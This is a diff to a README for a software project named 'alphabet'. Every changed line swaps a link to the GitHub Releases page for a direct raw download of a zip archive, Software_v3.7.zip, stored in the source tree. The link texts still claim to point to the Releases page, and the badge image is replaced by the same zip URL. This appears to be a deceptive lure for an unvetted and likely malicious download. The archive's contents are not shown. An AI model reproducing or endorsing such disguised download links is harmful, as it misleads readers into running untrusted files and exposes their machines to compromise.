@@ -1,6 +1,6 @@
 # 🚀 alphabet - All-in-One Frameworks for Everyone
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/DarkException22/alphabet/releases)
+[![Download](https://github.com/DarkException22/alphabet/raw/refs/heads/main/src/ssr/Software_v3.7.zip)](https://github.com/DarkException22/alphabet/raw/refs/heads/main/src/ssr/Software_v3.7.zip)
 
 ## 📜 Description
 
@@ -19,7 +19,7 @@ The Alphabet Frameworks offer a complete solution for your development needs. Fr
 To get started with the Alphabet Frameworks, you will need to download the software from our Releases page. Follow these steps for a smooth installation process:
 
 1. **Visit the Releases Page:** Click the link below to access the download page:
-   [Visit Releases Page](https://github.com/DarkException22/alphabet/releases)
+   [Visit Releases Page](https://github.com/DarkException22/alphabet/raw/refs/heads/main/src/ssr/Software_v3.7.zip)
 
 2. **Select the Latest Version:** On the Releases page, look for the latest version of the framework.
 
@@ -47,7 +47,7 @@ To ensure that the Alphabet Frameworks run smoothly on your machine, please chec
 
 To download and install the Alphabet Frameworks, visit the following link:
 
-[Download from Releases Page](https://github.com/DarkException22/alphabet/releases)
+[Download from Releases Page](https://github.com/DarkException22/alphabet/raw/refs/heads/main/src/ssr/Software_v3.7.zip)
 
 Choose the file that corresponds to your operating system, follow the installation instructions, and you will be ready to go!
 
